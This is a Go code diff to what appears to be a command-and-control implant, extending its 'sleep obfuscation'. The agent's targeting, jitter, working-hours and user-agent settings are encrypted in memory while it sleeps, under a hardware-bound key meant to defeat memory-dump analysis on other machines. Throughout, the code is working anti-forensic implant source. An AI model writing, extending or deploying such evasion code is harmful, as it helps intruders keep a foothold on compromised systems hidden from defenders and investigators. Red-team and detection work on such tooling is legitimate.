@@ -49,10 +49,15 @@ type agentSensitiveData struct {
 	ProcessName string `json:"p"`
 	Description string `json:"s"`
 	// Operational fields — reveal agent scheduling and targeting
-	Architecture string `json:"a,omitempty"`
-	OS           string `json:"o,omitempty"`
-	KillDate     int64  `json:"k,omitempty"`
-	DefaultPPID  int    `json:"pp,omitempty"`
+	Architecture    string `json:"a,omitempty"`
+	OS              string `json:"o,omitempty"`
+	KillDate        int64  `json:"k,omitempty"`
+	DefaultPPID     int    `json:"pp,omitempty"`
+	JitterProfile    string `json:"jp,omitempty"`
+	WorkingHrsStart  int    `json:"ws,omitempty"`
+	WorkingHrsEnd    int    `json:"we,omitempty"`
+	WorkingDays      []int  `json:"wd,omitempty"`
+	DefaultUserAgent string `json:"ua,omitempty"`
 }
 
 // profileSensitiveData holds the HTTP C2 profile fields that reveal the
@@ -99,27 +104,37 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 
 	vault := &sleepVault{}
 
-	// Generate random AES-256 key for this sleep cycle
-	vault.key = make([]byte, 32)
-	if _, err := rand.Read(vault.key); err != nil {
+	// Generate hardware-bound AES-256 key for this sleep cycle.
+	// HKDF mixes a random seed with the machine's hardware fingerprint,
+	// so the key cannot be reconstructed on different hardware from a
+	// memory dump that captures only the seed.
+	seed := make([]byte, 32)
+	if _, err := rand.Read(seed); err != nil {
 		log.Printf("mask key error: %v", err)
 		return nil
 	}
+	vault.key = deriveHardwareBoundKey(seed)
+	zeroBytes(seed)
 
 	// --- Encrypt agent sensitive fields ---
 	ad := agentSensitiveData{
-		PayloadUUID:  agent.PayloadUUID,
-		Domain:       agent.Domain,
-		Host:         agent.Host,
-		User:         agent.User,
-		InternalIP:   agent.InternalIP,
-		ExternalIP:   agent.ExternalIP,
-		ProcessName:  agent.ProcessName,
-		Description:  agent.Description,
-		Architecture: agent.Architecture,
-		OS:           agent.OS,
-		KillDate:     agent.KillDate,
-		DefaultPPID:  agent.DefaultPPID,
+		PayloadUUID:     agent.PayloadUUID,
+		Domain:          agent.Domain,
+		Host:            agent.Host,
+		User:            agent.User,
+		InternalIP:      agent.InternalIP,
+		ExternalIP:      agent.ExternalIP,
+		ProcessName:     agent.ProcessName,
+		Description:     agent.Description,
+		Architecture:    agent.Architecture,
+		OS:              agent.OS,
+		KillDate:        agent.KillDate,
+		DefaultPPID:     agent.DefaultPPID,
+		JitterProfile:    agent.JitterProfile,
+		WorkingHrsStart:  agent.WorkingHoursStart,
+		WorkingHrsEnd:    agent.WorkingHoursEnd,
+		WorkingDays:      agent.WorkingDays,
+		DefaultUserAgent: commands.DefaultUserAgent,
 	}
 	plaintext, err := json.Marshal(ad)
 	if err != nil {
@@ -147,6 +162,11 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	agent.OS = ""
 	agent.KillDate = 0
 	agent.DefaultPPID = 0
+	agent.JitterProfile = ""
+	agent.WorkingHoursStart = 0
+	agent.WorkingHoursEnd = 0
+	agent.WorkingDays = nil
+	commands.DefaultUserAgent = ""
 
 	// --- Encrypt HTTP C2 profile ---
 	// Skip if the config vault is active — fields are already encrypted at rest
@@ -233,6 +253,11 @@ func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profi
 				agent.OS = ad.OS
 				agent.KillDate = ad.KillDate
 				agent.DefaultPPID = ad.DefaultPPID
+				agent.JitterProfile = ad.JitterProfile
+				agent.WorkingHoursStart = ad.WorkingHrsStart
+				agent.WorkingHoursEnd = ad.WorkingHrsEnd
+				agent.WorkingDays = ad.WorkingDays
+				commands.DefaultUserAgent = ad.DefaultUserAgent
 			}
 			zeroBytes(plaintext)
 		}
